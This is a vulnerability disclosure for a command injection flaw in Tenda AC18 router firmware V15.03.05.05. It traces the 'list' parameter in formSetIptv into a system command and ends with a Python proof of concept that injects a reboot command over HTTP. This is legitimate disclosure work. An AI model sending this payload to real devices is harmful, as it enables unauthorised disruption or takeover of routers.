## Overview

- The device's official website: https://www.tenda.com.cn/product/overview/AC18.html

- Firmware download website: https://www.tenda.com.cn/download/detail-2610.html

## Affected version

V15.03.05.05

## Vulnerability details

The Tenda AC18 V15.03.05.05 firmware has a command injection vulnerability in the `formSetIptv` function. The `Var` variable receives the `list` parameter from a POST request and is later passed to the `sub_B0060` function. 

![image-20250602235312844](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20250602235312844.png)

![image-20250602235615835](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20250602235615835.png)

In function `sub_B0060`, the variable `a1` is directly assigned to `system` by `doSystemCmd` However, since the Since user can control the input of  `list`, the statemeant `doSystemCmd("nvram set adv.iptv.stballvlans=\"%s\"", a1);` can cause a command injection.

![image-20250602235634299](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20250602235634299.png)

## POC

```python
import requests

ip = "192.168.1.1"

url = f'http://{ip}/goform/SetIPTVCfg'
payload = '；reboot'

data = {"list": payload}

requests.post(url, data=data)
```

![image-20250602235743229](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20250602235743229.png)
